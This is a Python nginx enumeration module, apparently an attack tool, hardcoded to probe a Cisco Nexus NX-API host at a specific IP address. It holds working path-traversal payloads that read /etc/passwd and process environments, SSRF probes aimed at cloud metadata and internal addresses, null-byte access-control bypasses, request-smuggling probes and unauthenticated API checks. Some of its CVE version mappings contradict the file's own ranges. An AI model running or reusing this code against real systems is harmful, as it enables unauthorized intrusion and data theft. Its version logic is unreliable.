#!/usr/bin/env python3
"""
Nginx Enumeration Module — Ablation
Targets: Cisco Nexus NX-API frontend (nginx 1.7.10 on 207.254.14.1:443)

CVE coverage for nginx 1.7.x:
  CVE-2013-4547  null byte in URI bypasses access/rewrite rules
  CVE-2014-0133  SPDY heap overflow (2 requests)
  CVE-2014-3556  STARTTLS command injection via mail proxy
  CVE-2014-0088  SPDY memory corruption (initial 1.5.x SPDY)

Attack surfaces:
  stub_status  /nginx_status — active conns, req/s (no ACL default)
  alias        misconfig → path traversal (location /foo { alias /data/; })
  proxy_pass   variable backend $var → SSRF
  Host header  virtual host confusion → default_server fallback
  HTTP smuggle Transfer-Encoding + Content-Length desync

Synthesized from:
  NGINX HTTP Server 5e (9781788623551)
  NGINX HTTP Server (9781835469873)
  Nginx Troubleshooting (9781785288654)
  Mastering NGINX 2e (9781782173311)
"""

import re
import socket
import ssl
import struct
import time
from typing import Optional
from urllib.parse import urlparse

# ── Constants ─────────────────────────────────────────────────────────────────

STUB_STATUS_PATHS = [
    '/nginx_status',
    '/status',
    '/server-status',
    '/nginx-status',
    '/_nginx_status',
    '/basic_status',
]

# Common alias traversal payloads — probe for file read via alias misconfiguration
# location /static { alias /data/; } → GET /static../etc/passwd reads /etc/passwd
ALIAS_TRAVERSAL_PATHS = [
    '../etc/passwd',
    '../etc/nginx/nginx.conf',
    '../etc/nginx/conf.d/default.conf',
    '../proc/self/environ',
    '../proc/version',
]

# NX-API endpoints — Cisco Nexus serves these behind nginx 1.7.10
NXAPI_ENDPOINTS = [
    '/ins',          # NX-API REST/JSON-RPC
    '/api/v1',       # REST API root
    '/api/node/mo',  # managed object tree
    '/api/aaaLogin.json',  # auth endpoint
    '/admin',
    '/doc',          # often exposes NX-API docs
]

# Paths checked by check_autoindex
AUTOINDEX_PATHS = [
    '/', '/images/', '/static/', '/assets/', '/uploads/',
    '/files/', '/backup/', '/backups/', '/tmp/', '/logs/',
]

# Internal/status endpoints probed by check_internal_endpoint_exposure
INTERNAL_PROBE_PATHS = [
    '/internal/', '/admin/nginx_status', '/nginx_status', '/stub_status',
    '/metrics', '/healthz', '/ping', '/status',
]

# Version-specific CVE data
VERSION_CVES = {
    '1.7.10': [
        {
            'id': 'CVE-2013-4547',
            'severity': 'HIGH',
            'desc': 'Null byte in URI bypasses access controls and rewrite rules. '
                    'Versions < 1.5.7. Allows bypass of auth restrictions.',
            'exploit': 'GET /restricted.php%00.jpg',
        },
        {
            'id': 'CVE-2014-0133',
            'severity': 'HIGH',
            'desc': 'SPDY heap overflow via two crafted requests. '
                    'Requires --with-http_spdy_module (non-default).',
            'exploit': None,
        },
        {
            'id': 'CVE-2014-3556',
            'severity': 'MEDIUM',
            'desc': 'STARTTLS command injection in mail proxy module. '
                    'Attacker-controlled EHLO pipelining before STARTTLS.',
            'exploit': None,
        },
    ],
}


# ── HTTP helpers ──────────────────────────────────────────────────────────────

def _raw_http(host: str, port: int, request: bytes, use_tls: bool = True,
              timeout: float = 8.0) -> bytes:
    """Send raw bytes over TCP/TLS, return raw response bytes."""
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        if use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        sock.sendall(request)
        buf = b''
        sock.settimeout(timeout)
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                buf += chunk
                if len(buf) > 512 * 1024:
                    break
            except socket.timeout:
                break
        sock.close()
        return buf
    except Exception:
        return b''


def _http_get(host: str, port: int, path: str, headers: dict = None,
              use_tls: bool = True, timeout: float = 8.0) -> tuple:
    """
    Returns (status_code: int, headers_dict: dict, body: bytes).
    Returns (0, {}, b'') on connection failure.
    """
    hdrs = {
        'Host': host if port in (80, 443) else f'{host}:{port}',
        'User-Agent': 'Mozilla/5.0 (compatible)',
        'Accept': '*/*',
        'Connection': 'close',
    }
    if headers:
        hdrs.update(headers)

    hdr_lines = '\r\n'.join(f'{k}: {v}' for k, v in hdrs.items())
    request = (
        f'GET {path} HTTP/1.1\r\n'
        f'{hdr_lines}\r\n'
        '\r\n'
    ).encode()

    raw = _raw_http(host, port, request, use_tls=use_tls, timeout=timeout)
    if not raw:
        return 0, {}, b''

    try:
        header_end = raw.index(b'\r\n\r\n')
    except ValueError:
        return 0, {}, raw

    header_raw = raw[:header_end].decode('utf-8', errors='replace')
    body = raw[header_end + 4:]

    lines = header_raw.split('\r\n')
    status_line = lines[0]
    try:
        status_code = int(status_line.split()[1])
    except (IndexError, ValueError):
        status_code = 0

    resp_headers = {}
    for line in lines[1:]:
        if ':' in line:
            k, _, v = line.partition(':')
            resp_headers[k.strip().lower()] = v.strip()

    return status_code, resp_headers, body


# ── Stub status parser ────────────────────────────────────────────────────────

def _parse_stub_status(body: bytes) -> Optional[dict]:
    """
    Parse nginx stub_status body:
        Active connections: 4
        server accepts handled requests
         12 12 14
        Reading: 0 Writing: 1 Waiting: 3
    """
    text = body.decode('utf-8', errors='replace')
    out = {}

    m = re.search(r'Active connections:\s*(\d+)', text)
    if m:
        out['active_connections'] = int(m.group(1))

    m = re.search(r'(\d+)\s+(\d+)\s+(\d+)', text)
    if m:
        out['accepts']  = int(m.group(1))
        out['handled']  = int(m.group(2))
        out['requests'] = int(m.group(3))

    m = re.search(r'Reading:\s*(\d+)\s+Writing:\s*(\d+)\s+Waiting:\s*(\d+)', text)
    if m:
        out['reading'] = int(m.group(1))
        out['writing'] = int(m.group(2))
        out['waiting'] = int(m.group(3))

    return out if out else None


# ── Version fingerprint ───────────────────────────────────────────────────────

def _extract_version(headers: dict, body: bytes) -> Optional[str]:
    """
    Extract nginx version from Server header or error page.
    server_tokens on (default) → 'nginx/1.7.10'
    server_tokens off → 'nginx' (no version)
    """
    server = headers.get('server', '')
    m = re.search(r'nginx/(\d+\.\d+(?:\.\d+)?)', server)
    if m:
        return m.group(1)

    # Fallback: error page body
    body_str = body.decode('utf-8', errors='replace')
    m = re.search(r'nginx/(\d+\.\d+(?:\.\d+)?)', body_str)
    if m:
        return m.group(1)

    if 'nginx' in server.lower():
        return 'unknown (server_tokens off)'

    return None


# ── HTTP request smuggling probe ──────────────────────────────────────────────

def _probe_http_smuggling(host: str, port: int, use_tls: bool = True) -> dict:
    """
    TE.CL desync probe: send ambiguous Transfer-Encoding + Content-Length.
    Safe probe — does not send a poisoned body, just checks if server accepts
    chunked + Content-Length simultaneously (indicator of desync susceptibility).
    """
    # Craft a request with both TE and CL set — RFC-violating
    request = (
        f'POST / HTTP/1.1\r\n'
        f'Host: {host}\r\n'
        'Transfer-Encoding: chunked\r\n'
        'Content-Length: 6\r\n'
        'Connection: close\r\n'
        '\r\n'
        '0\r\n'
        '\r\n'
    ).encode()

    raw = _raw_http(host, port, request, use_tls=use_tls, timeout=6.0)
    if not raw:
        return {'tested': False, 'reason': 'no response'}

    text = raw.decode('utf-8', errors='replace')
    # If we get a 4xx with "400 Bad Request", the server correctly rejected it
    # If we get 200/405, the server processed without rejecting the ambiguity
    if '400' in text[:100]:
        return {'tested': True, 'susceptible': False, 'response': '400 (rejected)'}
    elif any(c in text[:100] for c in ['200', '301', '302', '405']):
        return {'tested': True, 'susceptible': True,
                'response': text.split('\r\n')[0],
                'note': 'Server accepted TE+CL — potential desync surface'}
    return {'tested': True, 'susceptible': None, 'response': text[:60]}


# ── SSRF via proxy_pass probe ─────────────────────────────────────────────────

def _probe_proxy_ssrf(host: str, port: int, paths: list = None,
                      use_tls: bool = True) -> list:
    """
    Probe proxy_pass endpoints that may accept arbitrary Host values,
    indicating upstream forwarding without validation.
    Also probes internal network targets via X-Forwarded-For injection.
    """
    if not paths:
        paths = ['/api/', '/proxy/', '/forward/', '/backend/']

    results = []
    ssrf_payloads = [
        ('localhost', '127.0.0.1:8080 (loopback SSRF)'),
        ('169.254.169.254', '169.254.169.254 (cloud metadata SSRF)'),
        ('10.0.0.1', '10.0.0.1 (RFC1918 internal SSRF)'),
    ]

    for path in paths:
        code, hdrs, body = _http_get(host, port, path, use_tls=use_tls)
        if code == 0:
            continue

        # Check if the path proxies requests — look for X-Powered-By, Via, etc.
        via = hdrs.get('via', '')
        x_powered = hdrs.get('x-powered-by', '')
        if via or x_powered or code in (200, 502, 503):
            for ssrf_host, label in ssrf_payloads:
                code2, hdrs2, body2 = _http_get(
                    host, port, path,
                    headers={'Host': ssrf_host, 'X-Forwarded-For': ssrf_host},
                    use_tls=use_tls,
                )
                if code2 not in (0, 400, 403):
                    results.append({
                        'path': path,
                        'ssrf_target': label,
                        'status': code2,
                        'via': via,
                    })

    return results


# ── Alias traversal probe ─────────────────────────────────────────────────────

def _probe_alias_traversal(host: str, port: int, base_paths: list = None,
                            use_tls: bool = True) -> list:
    """
    Alias misconfiguration → path traversal.
    location /static { alias /data/; }  ← missing trailing slash on location
    GET /static../etc/passwd → reads /data/../etc/passwd = /etc/passwd

    Cisco NX-API nginx: probe /api../etc/passwd, /ins../etc/passwd, etc.
    """
    if not base_paths:
        base_paths = ['/static', '/api', '/ins', '/media', '/files', '/assets']

    results = []
    for base in base_paths:
        for traversal in ALIAS_TRAVERSAL_PATHS:
            path = f'{base}../{traversal}'
            code, hdrs, body = _http_get(host, port, path, use_tls=use_tls)
            if code == 200 and body:
                body_str = body[:512].decode('utf-8', errors='replace')
                # Confirm it's a real file read, not a 200 fallback
                if any(sig in body_str for sig in [
                    'root:x:', 'daemon:', 'nobody:',  # /etc/passwd
                    'worker_processes', 'http {',       # nginx.conf
                    'HTTP_HOST', 'SERVER_NAME',          # environ
                    'Linux version',                     # /proc/version
                ]):
                    results.append({
                        'path': path,
                        'status': 200,
                        'severity': 'CRITICAL',
                        'type': 'ALIAS_TRAVERSAL',
                        'excerpt': body_str[:200],
                    })

    return results


# ── Host header virtual host confusion ────────────────────────────────────────

def _probe_host_header(host: str, port: int, use_tls: bool = True) -> dict:
    """
    Probe virtual host confusion:
    - No matching server_name → falls to default_server (potentially different app)
    - Blind injection of internal hostnames
    """
    results = {}

    # Baseline with correct host
    code_base, hdrs_base, body_base = _http_get(host, port, '/', use_tls=use_tls)
    results['baseline'] = {'status': code_base, 'server': hdrs_base.get('server', '')}

    # Probe with garbage Host header — should get same as default_server
    code_junk, hdrs_junk, body_junk = _http_get(
        host, port, '/',
        headers={'Host': 'not.a.real.hostname.invalid'},
        use_tls=use_tls,
    )
    results['junk_host'] = {'status': code_junk}

    # Probe with internal names — Cisco NX-API internal routing
    for internal_host in ['localhost', '127.0.0.1', 'nxapi', 'management']:
        code_i, hdrs_i, body_i = _http_get(
            host, port, '/',
            headers={'Host': internal_host},
            use_tls=use_tls,
        )
        if code_i != 0 and code_i != code_base:
            results[f'internal_{internal_host}'] = {
                'status': code_i,
                'diff_from_baseline': True,
                'note': f'Host: {internal_host} → different response',
            }

    return results


# ── CVE assessment ────────────────────────────────────────────────────────────

def _assess_cves(version: str) -> list:
    """Return applicable CVEs for detected nginx version."""
    if not version or version.startswith('unknown'):
        # Can't determine version — return all known 1.7.x CVEs as candidates
        return VERSION_CVES.get('1.7.10', [])

    findings = []
    parts = version.split('.')
    try:
        major, minor, patch = int(parts[0]), int(parts[1]), int(parts[2]) if len(parts) > 2 else 0
    except (ValueError, IndexError):
        return []

    # CVE-2013-4547: affects < 1.5.7
    if (major == 1 and minor < 5) or (major == 1 and minor == 5 and patch < 7):
        findings.append(VERSION_CVES['1.7.10'][0])

    # CVE-2014-0133: SPDY heap, affects 1.3.15-1.5.11
    if major == 1 and ((minor == 3 and patch >= 15) or
                        (4 <= minor <= 4) or
                        (minor == 5 and patch <= 11)):
        findings.append(VERSION_CVES['1.7.10'][1])

    # If version is 1.7.10 exactly — all three CVEs applicable
    if major == 1 and minor == 7 and patch == 10:
        return VERSION_CVES['1.7.10']

    return findings


# ── Null byte probe (CVE-2013-4547) ──────────────────────────────────────────

def _probe_null_byte(host: str, port: int, use_tls: bool = True) -> dict:
    """
    CVE-2013-4547: null byte (%00) in URI bypasses access control directives.
    In nginx < 1.5.7, location matching uses C-string semantics — null terminates.
    GET /protected.php%00.jpg → nginx sees /protected.php%00, matches no deny block.
    """
    payloads = [
        '/nginx_status%00.jpg',
        '/api%00.jpg',
        '/.git%00.txt',
    ]

    results = []
    for path in payloads:
        # Send raw — URL encoding must stay encoded
        request = (
            f'GET {path} HTTP/1.1\r\n'
            f'Host: {host}\r\n'
            'User-Agent: Mozilla/5.0\r\n'
            'Connection: close\r\n'
            '\r\n'
        ).encode()

        raw = _raw_http(host, port, request, use_tls=use_tls)
        if not raw:
            continue

        status_line = raw.split(b'\r\n')[0].decode('utf-8', errors='replace')
        try:
            code = int(status_line.split()[1])
        except (IndexError, ValueError):
            continue

        if code not in (400, 404, 403):
            results.append({
                'path': path,
                'status': code,
                'note': 'Unexpected status — potential CVE-2013-4547 bypass',
            })

    return {'probed': True, 'hits': results}


# ── NX-API endpoint enumeration ───────────────────────────────────────────────

def _enum_nxapi_endpoints(host: str, port: int, use_tls: bool = True) -> list:
    """
    Enumerate NX-API endpoints served behind nginx 1.7.10 on Cisco Nexus.
    Returns accessible endpoints with status + response snippet.
    """
    results = []
    for path in NXAPI_ENDPOINTS:
        code, hdrs, body = _http_get(host, port, path, use_tls=use_tls)
        if code == 0:
            continue

        body_snippet = body[:256].decode('utf-8', errors='replace') if body else ''
        content_type = hdrs.get('content-type', '')

        entry = {
            'path': path,
            'status': code,
            'content_type': content_type,
        }

        # Flag accessible NX-API surfaces
        if code in (200, 401, 405):
            entry['accessible'] = True
            entry['snippet'] = body_snippet

        # Unauth NX-API response detection
        if code == 200 and any(k in body_snippet for k in [
            '"ins_api"', 'nxapi', 'NX-API', '"version"', 'Cisco'
        ]):
            entry['severity'] = 'HIGH'
            entry['type'] = 'NXAPI_UNAUTH'
            entry['note'] = 'NX-API endpoint responded without auth'

        results.append(entry)

    return results


# ── Main enumerator class ─────────────────────────────────────────────────────

class NginxEnumerator:
    """
    Nginx fingerprint, stub_status probe, CVE check, and attack surface enumeration.
    Designed for Cisco Nexus NX-API nginx 1.7.10 on 207.254.14.1:443.
    """

    MACSTADIUM_HOST = '207.254.14.1'
    MACSTADIUM_PORT = 443

    def __init__(self, host: str = None, port: int = 443, use_tls: bool = True,
                 timeout: float = 8.0):
        self.host = host or self.MACSTADIUM_HOST
        self.port = port
        self.use_tls = use_tls
        self.timeout = timeout
        self.findings = []
        self._version = None
        self._stub_status = None

    # ── internal finding builder ──────────────────────────────────────────────

    def _add(self, severity: str, ftype: str, desc: str, detail: str = '',
             exploit: str = '', source: str = ''):
        self.findings.append({
            'severity': severity,
            'type': ftype,
            'description': desc,
            'detail': detail,
            'exploit': exploit,
            'source': source or f'{self.host}:{self.port}',
        })

    # ── fingerprint ───────────────────────────────────────────────────────────

    def fingerprint(self) -> dict:
        """GET / and a 404 — extract Server header version, check server_tokens."""
        code, hdrs, body = _http_get(
            self.host, self.port, '/',
            use_tls=self.use_tls, timeout=self.timeout,
        )
        if code == 0:
            return {'reachable': False}

        version = _extract_version(hdrs, body)
        self._version = version

        server_hdr = hdrs.get('server', '')
        tokens_on = bool(re.search(r'nginx/\d', server_hdr))

        result = {
            'reachable': True,
            'status': code,
            'server_header': server_hdr,
            'version': version,
            'server_tokens_on': tokens_on,
            'headers': {k: v for k, v in hdrs.items()
                        if k in ('server', 'x-powered-by', 'via', 'x-nginx-upstream')},
        }

        if tokens_on and version:
            self._add(
                'INFO', 'VERSION_DISCLOSURE',
                f'Server header exposes nginx/{version}',
                detail=f'Server: {server_hdr}',
                exploit='Version-specific CVE targeting',
            )

        return result

    # ── stub_status ───────────────────────────────────────────────────────────

    def probe_stub_status(self) -> dict:
        """Probe all stub_status paths for unprotected metrics endpoint."""
        for path in STUB_STATUS_PATHS:
            code, hdrs, body = _http_get(
                self.host, self.port, path,
                use_tls=self.use_tls, timeout=self.timeout,
            )
            if code == 200 and body:
                parsed = _parse_stub_status(body)
                if parsed:
                    self._stub_status = parsed
                    self._add(
                        'MEDIUM', 'STUB_STATUS_EXPOSED',
                        f'nginx stub_status accessible at {path}',
                        detail=str(parsed),
                        exploit=f'GET https://{self.host}{path}',
                    )
                    return {
                        'found': True,
                        'path': path,
                        'data': parsed,
                        'raw': body.decode('utf-8', errors='replace')[:256],
                    }

        return {'found': False, 'paths_probed': STUB_STATUS_PATHS}

    # ── CVE check ─────────────────────────────────────────────────────────────

    def check_cves(self) -> list:
        """Assess CVEs for detected nginx version."""
        cves = _assess_cves(self._version)
        for cve in cves:
            self._add(
                cve['severity'], 'CVE',
                f'{cve["id"]}: {cve["desc"]}',
                exploit=cve.get('exploit') or '',
                source=f'{self.host}:{self.port}',
            )
        return cves

    # ── null byte ─────────────────────────────────────────────────────────────

    def probe_null_byte(self) -> dict:
        return _probe_null_byte(self.host, self.port, use_tls=self.use_tls)

    # ── alias traversal ───────────────────────────────────────────────────────

    def probe_alias_traversal(self) -> list:
        hits = _probe_alias_traversal(self.host, self.port, use_tls=self.use_tls)
        for h in hits:
            self._add(
                h['severity'], h['type'],
                f'Alias path traversal: {h["path"]}',
                detail=h.get('excerpt', ''),
                exploit=f'GET https://{self.host}{h["path"]}',
            )
        return hits

    # ── SSRF ──────────────────────────────────────────────────────────────────

    def probe_ssrf(self) -> list:
        hits = _probe_proxy_ssrf(self.host, self.port, use_tls=self.use_tls)
        for h in hits:
            self._add(
                'HIGH', 'PROXY_SSRF',
                f'proxy_pass SSRF via {h["path"]} → {h["ssrf_target"]}',
                detail=str(h),
                exploit=f'GET {h["path"]} Host: {h["ssrf_target"]}',
            )
        return hits

    # ── Host header ───────────────────────────────────────────────────────────

    def probe_host_header(self) -> dict:
        return _probe_host_header(self.host, self.port, use_tls=self.use_tls)

    # ── HTTP smuggling ────────────────────────────────────────────────────────

    def probe_smuggling(self) -> dict:
        result = _probe_http_smuggling(self.host, self.port, use_tls=self.use_tls)
        if result.get('susceptible'):
            self._add(
                'HIGH', 'HTTP_SMUGGLING',
                'Server accepted TE+CL simultaneously — desync surface',
                detail=str(result),
                exploit='TE.CL desync: Transfer-Encoding: chunked + Content-Length',
            )
        return result

    # ── NX-API endpoints ──────────────────────────────────────────────────────

    def enum_nxapi(self) -> list:
        endpoints = _enum_nxapi_endpoints(self.host, self.port, use_tls=self.use_tls)
        for ep in endpoints:
            if ep.get('severity') == 'HIGH':
                self._add(
                    'HIGH', ep['type'],
                    ep.get('note', ''),
                    detail=ep.get('snippet', ''),
                    exploit=f'GET https://{self.host}{ep["path"]}',
                )
        return endpoints

    # ── check_server_tokens ───────────────────────────────────────────────────

    def check_server_tokens(self) -> list:
        """
        Probe Server header for nginx version string.
        - Full version visible → LOW (version disclosure)
        - version < 1.18.0     → MEDIUM + CVE-2019-20372 (HTTP/2 error_page SSRF)
        - version < 1.20.1     → HIGH   + CVE-2021-23017 (DNS resolver overflow)
        """
        findings = []
        code, hdrs, body = _http_get(
            self.host, self.port, '/',
            use_tls=self.use_tls, timeout=self.timeout,
        )
        if code == 0:
            return findings

        server = hdrs.get('server', '')
        version = _extract_version(hdrs, body)

        # No version string exposed — server_tokens off or not nginx
        if not version or version.startswith('unknown'):
            return findings

        # Parse version tuple
        parts = version.split('.')
        try:
            major = int(parts[0])
            minor = int(parts[1])
            patch = int(parts[2]) if len(parts) > 2 else 0
        except (ValueError, IndexError):
            major, minor, patch = 0, 0, 0

        # Map version to CVE
        cve_id = None
        severity = 'LOW'
        title = f'nginx version disclosure via Server header (nginx/{version})'

        # CVE-2021-23017: 0.6.18 <= version <= 1.20.0 — DNS resolver 1-byte overflow
        # Check HIGH range first (wider blast radius)
        if (major == 1 and (minor < 20 or (minor == 20 and patch == 0))) or \
           (major == 0 and (minor > 6 or (minor == 6 and patch >= 18))):
            severity = 'HIGH'
            cve_id = 'CVE-2021-23017'
            title = (f'nginx/{version} in CVE-2021-23017 range — '
                     f'DNS resolver 1-byte overflow via crafted UDP response')
        # CVE-2019-20372: affects 1.9.5-1.17.6 (< 1.18.0)
        elif major == 1 and minor < 18:
            severity = 'MEDIUM'
            cve_id = 'CVE-2019-20372'
            title = (f'nginx/{version} in CVE-2019-20372 range — '
                     f'HTTP/2 error_page SSRF (server-side request forgery)')

        f = {
            'severity': severity,
            'title': title,
            'detail': f'Server: {server}',
            'host': self.host,
            'port': self.port,
            'cve': cve_id,
        }
        findings.append(f)
        self._add(
            severity, 'SERVER_TOKENS',
            title,
            detail=f'Server: {server}',
            exploit='Version-targeted CVE exploitation' if cve_id else 'Version fingerprinting',
        )
        # Cache version for downstream methods
        if not self._version:
            self._version = version
        return findings

    # ── check_autoindex ───────────────────────────────────────────────────────

    def check_autoindex(self) -> list:
        """
        Probe common directories for autoindex on (directory listing).
        Signature: '<title>Index of' or '<h1>Index of' in response body.
        Each match → CRITICAL finding.
        """
        findings = []
        for path in AUTOINDEX_PATHS:
            code, hdrs, body = _http_get(
                self.host, self.port, path,
                use_tls=self.use_tls, timeout=self.timeout,
            )
            if code != 200 or not body:
                continue
            body_str = body[:8192].decode('utf-8', errors='replace')
            if '<title>Index of' in body_str or '<h1>Index of' in body_str:
                # Grab a sample of listed entries
                entries = re.findall(r'href="([^"?#][^"]*)"', body_str)
                sample = ', '.join(entries[:8]) if entries else '(no hrefs parsed)'
                f = {
                    'severity': 'CRITICAL',
                    'title': f'Directory listing enabled: {path}',
                    'detail': f'autoindex on at {path}; entries: {sample}',
                    'host': self.host,
                    'port': self.port,
                    'cve': None,
                }
                findings.append(f)
                self._add(
                    'CRITICAL', 'AUTOINDEX',
                    f'Directory listing at {path}',
                    detail=f['detail'],
                    exploit=f'GET {"https" if self.use_tls else "http"}://{self.host}{path}',
                )
        return findings

    # ── check_internal_endpoint_exposure ─────────────────────────────────────

    def check_internal_endpoint_exposure(self) -> list:
        """
        Probe internal/status paths.
        /nginx_status stub_status response → HIGH with parsed connection stats.
        Other 200s → MEDIUM (internal endpoint accessible without ACL).
        """
        findings = []
        for path in INTERNAL_PROBE_PATHS:
            code, hdrs, body = _http_get(
                self.host, self.port, path,
                use_tls=self.use_tls, timeout=self.timeout,
            )
            if code != 200 or not body:
                continue

            body_str = body[:4096].decode('utf-8', errors='replace')
            parsed = _parse_stub_status(body) if 'Active connections' in body_str else None

            if parsed:
                evidence = (
                    f"Active connections: {parsed.get('active_connections', '?')}  "
                    f"Reading: {parsed.get('reading', '?')}  "
                    f"Writing: {parsed.get('writing', '?')}  "
                    f"Waiting: {parsed.get('waiting', '?')}  "
                    f"Requests: {parsed.get('requests', '?')}"
                )
                f = {
                    'severity': 'HIGH',
                    'title': f'nginx stub_status exposed at {path} — connection counts leak',
                    'detail': evidence,
                    'host': self.host,
                    'port': self.port,
                    'cve': None,
                }
                findings.append(f)
                self._add(
                    'HIGH', 'STUB_STATUS_EXPOSED',
                    f['title'],
                    detail=evidence,
                    exploit=f'GET {"https" if self.use_tls else "http"}://{self.host}{path}',
                )
                # Cache for CVE methods
                if self._stub_status is None:
                    self._stub_status = parsed
            else:
                # Generic internal endpoint with 200 — no ACL
                f = {
                    'severity': 'MEDIUM',
                    'title': f'Internal endpoint accessible without ACL: {path}',
                    'detail': body_str[:256].strip(),
                    'host': self.host,
                    'port': self.port,
                    'cve': None,
                }
                findings.append(f)
                self._add(
                    'MEDIUM', 'INTERNAL_ENDPOINT',
                    f'Internal path {path} returns 200 — missing allow/deny ACL or internal directive',
                    detail=body_str[:256].strip(),
                    exploit=f'GET {"https" if self.use_tls else "http"}://{self.host}{path}',
                )
        return findings

    # ── check_basic_auth_over_http ────────────────────────────────────────────

    def check_basic_auth_over_http(self) -> list:
        """
        Check for Basic auth challenge served over HTTP (cleartext).
        Probes port 80 (no TLS). If WWW-Authenticate: Basic is present and
        the response is not a redirect to HTTPS → HIGH credential exposure.
        If HTTPS redirect is present, distinguishes correctly (not a finding).
        """
        findings = []
        http_port = 80

        code, hdrs, body = _http_get(
            self.host, http_port, '/',
            use_tls=False, timeout=self.timeout,
        )
        if code == 0:
            return findings

        www_auth = hdrs.get('www-authenticate', '')
        location = hdrs.get('location', '')

        if 'basic' in www_auth.lower():
            # Redirect to HTTPS on same host → safe; credentials would be
            # sent only after TLS upgrade
            redirects_https = location.lower().startswith('https://')
            if not redirects_https:
                f = {
                    'severity': 'HIGH',
                    'title': 'Basic auth served over cleartext HTTP — credential exposure',
                    'detail': (
                        f'WWW-Authenticate: {www_auth}  '
                        f'Port: {http_port}  '
                        f'No HTTPS redirect detected (Location: {location or "absent"})'
                    ),
                    'host': self.host,
                    'port': http_port,
                    'cve': None,
                }
                findings.append(f)
                self._add(
                    'HIGH', 'BASIC_AUTH_HTTP',
                    f['title'],
                    detail=f['detail'],
                    exploit=f'MitM HTTP on {self.host}:{http_port}; intercept Authorization: Basic header',
                )
        elif code in (301, 302, 307, 308) and location.lower().startswith('https://'):
            # Port 80 redirects to HTTPS — check HTTPS for Basic auth (informational)
            code_s, hdrs_s, _ = _http_get(
                self.host, self.port, '/',
                use_tls=True, timeout=self.timeout,
            )
            www_auth_s = hdrs_s.get('www-authenticate', '')
            if 'basic' in www_auth_s.lower():
                # Basic over HTTPS — not a finding (correctly configured)
                pass

        return findings

    # ── check_cve_2021_23017 ──────────────────────────────────────────────────

    def check_cve_2021_23017(self) -> list:
        """
        CVE-2021-23017: nginx 0.6.18-1.20.0 UDP DNS resolver 1-byte overflow.
        Exploitable when the resolver directive is configured and an attacker
        can inject a crafted DNS response (MITM on resolver path).
        Version extracted from Server header, error body, or stub_status.
        """
        findings = []

        # Ensure version is populated
        version = self._version
        if not version:
            code, hdrs, body = _http_get(
                self.host, self.port, '/',
                use_tls=self.use_tls, timeout=self.timeout,
            )
            if code != 0:
                version = _extract_version(hdrs, body)
                self._version = version

        # Fall back to stub_status if Server header was suppressed
        if not version or version.startswith('unknown'):
            for path in STUB_STATUS_PATHS:
                code, hdrs, body = _http_get(
                    self.host, self.port, path,
                    use_tls=self.use_tls, timeout=self.timeout,
                )
                if code == 200:
                    v = _extract_version(hdrs, body)
                    if v and not v.startswith('unknown'):
                        version = v
                        self._version = version
                        break

        if not version or version.startswith('unknown'):
            return findings

        parts = version.split('.')
        try:
            major = int(parts[0])
            minor = int(parts[1])
            patch = int(parts[2]) if len(parts) > 2 else 0
        except (ValueError, IndexError):
            return findings

        # Vulnerable range: 0.6.18 <= version <= 1.20.0
        in_range = False
        if major == 0 and (minor > 6 or (minor == 6 and patch >= 18)):
            in_range = True
        elif major == 1 and minor < 20:
            in_range = True
        elif major == 1 and minor == 20 and patch == 0:
            in_range = True

        if not in_range:
            return findings

        f = {
            'severity': 'HIGH',
            'title': f'CVE-2021-23017: nginx {version} DNS resolver 1-byte heap overflow',
            'detail': (
                f'nginx/{version} falls in vulnerable range 0.6.18-1.20.0. '
                f'Off-by-one write in the UDP DNS resolver via a crafted CNAME response '
                f'from an attacker-controlled or poisoned nameserver. '
                f'Requires resolver directive to be active in nginx.conf. '
                f'Fixed in 1.21.0 (mainline) and 1.20.1 (stable).'
            ),
            'host': self.host,
            'port': self.port,
            'cve': 'CVE-2021-23017',
        }
        findings.append(f)
        self._add(
            'HIGH', 'CVE',
            f['title'],
            detail=f['detail'],
            exploit='Craft CNAME DNS response with off-by-one length; requires MITM on nginx resolver path',
        )
        return findings

    # ── Full run ──────────────────────────────────────────────────────────────

    def run(self) -> dict:
        results = {}

        results['fingerprint'] = self.fingerprint()
        if not results['fingerprint'].get('reachable'):
            return {'reachable': False, 'host': self.host, 'port': self.port}

        results['stub_status']               = self.probe_stub_status()
        results['cves']                      = self.check_cves()
        results['alias_traversal']           = self.probe_alias_traversal()
        results['host_header']               = self.probe_host_header()
        results['smuggling']                 = self.probe_smuggling()
        results['nxapi_endpoints']           = self.enum_nxapi()
        results['null_byte']                 = self.probe_null_byte()

        # New checks from 9781782173311 chapters
        results['server_tokens']             = self.check_server_tokens()
        results['autoindex']                 = self.check_autoindex()
        results['internal_endpoint_exposure']= self.check_internal_endpoint_exposure()
        results['basic_auth_over_http']      = self.check_basic_auth_over_http()
        results['cve_2021_23017']            = self.check_cve_2021_23017()

        # SSRF last — most network-chatty
        results['ssrf'] = self.probe_ssrf()

        results['findings'] = self.findings
        results['host'] = self.host
        results['port'] = self.port

        return results

    def report(self) -> str:
        lines = ['=' * 60, f'NGINX ENUMERATION — {self.host}:{self.port}', '=' * 60]

        if not self.findings:
            lines.append('No findings.')
            return '\n'.join(lines)

        by_sev = {'CRITICAL': [], 'HIGH': [], 'MEDIUM': [], 'LOW': [], 'INFO': []}
        for f in self.findings:
            by_sev.setdefault(f['severity'], []).append(f)

        for sev in ('CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO'):
            for f in by_sev[sev]:
                lines.append(f'\n[{sev}] {f["type"]}')
                lines.append(f'  {f["description"]}')
                if f.get('detail'):
                    lines.append(f'  detail : {f["detail"][:100]}')
                if f.get('exploit'):
                    lines.append(f'  exploit: {f["exploit"][:100]}')

        return '\n'.join(lines)


# ── MacStadium convenience ────────────────────────────────────────────────────

def enumerate_macstadium_nginx() -> dict:
    """Probe the Cisco Nexus nginx 1.7.10 frontend at 207.254.14.1:443."""
    enum = NginxEnumerator(
        host='207.254.14.1',
        port=443,
        use_tls=True,
    )
    return enum.run()


# ── Web content discovery / attack-surface probes ────────────────────────────

def probe_common_sensitive_paths(
        host: str, port: int = 443, use_tls: bool = True,
        timeout: float = 5.0) -> list:
    """
    GET common sensitive file/directory paths.  Returns findings list.

    Severity mapping:
      CRITICAL — config files that expose secrets (git, .env, wp-config, web.config)
      HIGH     — admin/backup directories
      MEDIUM   — PHP info pages
    """
    findings = []

    path_map = [
